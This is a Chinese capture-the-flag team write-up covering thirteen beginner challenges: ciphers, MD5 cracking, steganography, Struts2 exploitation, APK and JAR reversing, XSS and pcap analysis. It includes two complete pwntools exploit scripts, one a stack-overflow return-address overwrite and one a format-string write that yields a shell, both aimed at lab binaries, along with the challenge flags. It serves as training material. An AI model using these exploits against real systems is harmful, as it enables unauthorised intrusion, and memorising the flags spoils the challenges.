水电厂划水爱好者战队WriteUp

### 0x01 Caesar

Flag：flag{CaesarCipherIsSimple}

解题过程：

直接工具跑一下就行

![image-20201121164709321](images/水电厂划水爱好者战队WriteUp/image-20201121164709321.png)

### 0x02 支付密码

Flag：flag{200908}

解题过程：

直接破解md5

![image-20201121165011565](images/水电厂划水爱好者战队WriteUp/image-20201121165011565.png)

### 0x03 pwn初体验

Flag: flag{7ca5212d-7a5a-481a-b04a-d5d940e8630d}

解题过程：

检测二进制保护，确认是32位程序，没有开启栈保护

![image-20201121165948146](images/水电厂划水爱好者战队WriteUp/image-20201121165948146.png)

使用ida查看，如下为关键源码，gets函数可以输入任意长度的字符串，这里存在明显的栈溢出漏洞

![image-20201121170107247](images/水电厂划水爱好者战队WriteUp/image-20201121170107247.png)

并且可以发现该二进制存在明显后面，可以直接读取flag

![image-20201121170220034](images/水电厂划水爱好者战队WriteUp/image-20201121170220034.png)

利用思路，直接将返回地址覆盖成后面函数即可，结果如下：

![image-20201121165308639](images/水电厂划水爱好者战队WriteUp/image-20201121165308639.png)

附攻击脚本：

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2020/11/21 9:12
# @Author  : ouzy
# @File    : retaddr.py

from pwn import *
binary_file = './retaddr'                # 文件名
context.binary = binary_file

# switches

if len(sys.argv) == 1:
    DEBUG = 1
else:
    DEBUG = 0
# modify this
if DEBUG:
    io = process([binary_file])
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

context(log_level='debug')

# define symbols and offsets here

offset = 268
vuln = 0x0804856B               # main


# define exploit function here
def pwn():

    # gdb
    print "pid: " + str(proc.pidof(io))
    raw_input()

    payload = flat(['A' * offset, vuln])
    io.recvuntil("?\n")
    io.sendline(payload)
    io.interactive()
    return


if __name__ == '__main__':
    pwn()

```

### 0x04 打印字符不能偷懒

Flag: flag{1f3a30fe-13a1-49d3-adac-8073a10188f7}

解题过程：

检测二进制保护，确认是32位程序，啥保护都没开

![image-20201121172101573](images/水电厂划水爱好者战队WriteUp/image-20201121172101573.png)

ida打开查看，存在明显的目标，就是要让key=35795746，就可以getshell

![image-20201121172401769](images/水电厂划水爱好者战队WriteUp/image-20201121172401769.png)

imagemagic函数存在明显的格式化字符串漏洞

![image-20201121172519801](images/水电厂划水爱好者战队WriteUp/image-20201121172519801.png)

调试漏洞点，AAAA第一次出现在第12个位置，得知字符串在栈上的偏移是12。

![image-20201121172653093](images/水电厂划水爱好者战队WriteUp/image-20201121172653093.png)

最后直接利用pwntools的fmtstr_payload工具将35795746写入到key的位置即可。

![image-20201121173145183](images/水电厂划水爱好者战队WriteUp/image-20201121173145183.png)

利用结果如下：

![image-20201121170552087](images/水电厂划水爱好者战队WriteUp/image-20201121170552087.png)

附攻击脚本：

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2020/11/21 9:15
# @Author  : ouzy
# @File    : string.py

from pwn import *
binary_file = './string'                # 文件名
context.binary = binary_file

# switches

if len(sys.argv) == 1:
    DEBUG = 1
else:
    DEBUG = 0
# modify this
if DEBUG:
    io = process([binary_file])
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

context(log_level='debug')

# define symbols and offsets here

offset = 12
vuln = 0x0804A048               # main
val = 35795746


# define exploit function here
def pwn():

    # gdb
    print "pid: " + str(proc.pidof(io))
    raw_input()

    payload = fmtstr_payload(offset, {vuln: val})
    io.sendline(payload)
    io.interactive()
    return


if __name__ == '__main__':
    pwn()

```

### 0x05 如花

Flag: flag{ru_hua_zhen_shi_la_yan_jing}

解题过程：

binwalk发现该jpg存在zip包

![image-20201121173637787](images/水电厂划水爱好者战队WriteUp/image-20201121173637787.png)

使用binwalk进行分离

![image-20201121173715940](images/水电厂划水爱好者战队WriteUp/image-20201121173715940.png)

发现压缩包有个png图片且存在密码

![image-20201121173732972](images/水电厂划水爱好者战队WriteUp/image-20201121173732972.png)

尝试弱密码123456成功解压缩，得到一张png图片，根据文件名推测应该是png隐写。

![image-20201121173757472](images/水电厂划水爱好者战队WriteUp/image-20201121173757472.png)

尝试了很多种脚本无果后，发现zsteg工具的分析输出有明显提示(ruhua.txt)：

zsteg steganography.png

![image-20201121174734644](images/水电厂划水爱好者战队WriteUp/image-20201121174734644.png)

尝试将其分离

zsteg -E "b1,rgba,lsb,xy" steganography.png > file

分离出来的文件有PK字样，应该是一个zip压缩包，将如下选中部分分离出来即可

![img](images/水电厂划水爱好者战队WriteUp/632b313a-43d5-4f87-a72e-75ccd33a1bc7.png)

![img](images/水电厂划水爱好者战队WriteUp/a14b4f62-764d-4886-bcfb-459610120901.png)

![img](images/水电厂划水爱好者战队WriteUp/c0afec11-df3f-4e13-af42-97d55f7e5f36.png)

![img](images/水电厂划水爱好者战队WriteUp/8a6d2fc4-873c-427b-a12f-5bb8fe04d6b5.png)

最终得到flag。

### 0x06 Web7以及Web7(new)

Flag: None{5b6c8dbde5a245ce8ae340709353be0b}

Flag: flag{test}

解题过程：

打开网页发现标题说是struts2环境

![image-20201121175308377](images/水电厂划水爱好者战队WriteUp/image-20201121175308377.png)

直接用s2工具测试，发现存在s2-045，s2-046漏洞，直接使用工具执行命令即可：

![img](images/水电厂划水爱好者战队WriteUp/476fa0ee-7eeb-4d65-80fb-bc213516feaf.png)

![image-20201121180027378](images/水电厂划水爱好者战队WriteUp/image-20201121180027378.png)

### 0x07 hard coding

Flag: flag{monkey99}

解题过程：

命令运行exercise1.jar，发现要输入正确密码

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wr4_tmp_92991731ec448e39.png)

反编译打开exercise1.jar，发现main方法里判断密码是否正确时调用checkPassword()方法

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wr4_tmp_8e96658baafa6bbe.png)

找到checkPassword()，发现返回值为经过MD5加密的字符串

“fa3733c647dca53a66cf8df953c2d539”

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wr4_tmp_8c235716f5ea0fc.png)

使用MD5解码“fa3733c647dca53a66cf8df953c2d539”得到“monkey99”

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wr4_tmp_2efa33ee0ee33e0e.png)

在命令行输入密码“monkey99”，显示正确。

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wr4_tmp_f96764c7571490a8.png)

输入flag{monkey99}

![image-20201121195618457](images/水电厂划水爱好者战队WriteUp/image-20201121195618457.png)

### 0x08 easy apk

Flag: flag{OnlyAsStrongAsWeakestLink}

解题过程：

下载的附件解压后为apk文件，安装后需要输入pin，随便输入一个报错。

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wrc_tmp_2a44a120ecd6f76a.png)

反编译apk文件，找到报错的代码，分析得知输入值与数据库中的pin作比较。

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wrc_tmp_9c7c202f86473b86.png)

打开资源文件中的sqlite文件，发现作比较的pin值。

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wrc_tmp_987213844df1197a.png)

通过MD5解码，得到7498，再次输入pin值，进入如下界面。

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wrc_tmp_3c4a1245fefd733d.png)

再次分析得知，该程序只取了数据库中secretsDBv1的值，flag可能在secretsDBv2表中，修改反编译的smail文件，分别将DatabaseUtilities与SecretDisplay中的对应部分改为v2。

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wrc_tmp_9268c6ae8070feb7.png)

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wrc_tmp_f1dfe664ddd34216.png)

重新打包编译，运行后输入7498，进入如下界面，获取到flag。![img](file:///C:/Users/ou/AppData/Local/Temp/lu2324o6wpi.tmp/lu2324o6wrc_tmp_54534512bd8de603.png)

### 0x09 secret

Flag: flag{i_am_secret}

解题过程：

打开页面后F12，查看source，找到注释语句包含flag。 ![img](file:///C:/Users/ou/AppData/Local/Temp/lu2324o6wpi.tmp/lu2324o6wrl_tmp_e04cac6455c5f2eb.png)

### 0x0a easy xss

Flag: flag{b4be6f5ac471ad255321b46aad09ece5}

解题过程：

打开页面后F12，在图片标签中添加onclick=”alert(1)”，再次点击图片时flag被报出来。

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wrt_tmp_1dc721f48ac86aac.png)

### 0x0b 签到

Flag: flag{icbc_sdc_ctf_666}

解题过程：

直接由提示得到flag{icbc_sdc_ctf_666}

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6wrx_tmp_7192083728e0ba14.png)

### 0x0c plaintext

Flag: flag{plaintext_psw_is_danger}

解题过程：

解压plaintext.zip得到plaintext.pcapng，并使用Wireshake打开

对请求进行分析

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6ws1_tmp_d252a48ad350fd09.png)

在请求头中找到password=flag%7Bplaintext_psw_is_danger%7D

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6ws1_tmp_8f63aa307f98cf55.png)

对flag%7Bplaintext_psw_is_danger%7D进行decode解码，得到flag{plaintext_psw_is_danger}

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6ws1_tmp_c6f45193cfcc9e94.png)

提交flag

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6ws1_tmp_f6b08321426b6520.png)

### 0x0d plaintext2

Flag: flag{base64_is_not_encryption}

解题过程：

解压plaintext.zip得到plaintext.pcapng，并使用Wireshake打开

对请求进行分析

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6ws7_tmp_c6025e6bcec60cdc.png)

在请求头中找到password=ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6ws7_tmp_dde6ae5b772e32d3.png)

对“ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259”进行Base64解码，得到flag{base64_is_not_encryption}

![img](images/水电厂划水爱好者战队WriteUp/lu2324o6ws7_tmp_494f4478f3faf195.png)













